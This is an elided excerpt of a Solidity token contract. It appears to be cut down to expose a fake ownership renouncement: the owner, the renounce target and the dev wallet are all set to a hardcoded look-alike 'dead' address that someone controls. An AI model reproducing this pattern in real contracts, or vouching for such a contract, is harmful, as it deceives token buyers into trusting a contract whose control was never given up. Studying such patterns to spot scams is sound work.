...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x00004A864476e65e9f540cA7950f3793D1D0deAD;
    ...
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x00004A864476e65e9f540cA7950f3793D1D0deAD));
        _owner = address(0x00004A864476e65e9f540cA7950f3793D1D0deAD);
    }
...
contract Max is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x00004A864476e65e9f540cA7950f3793D1D0deAD);
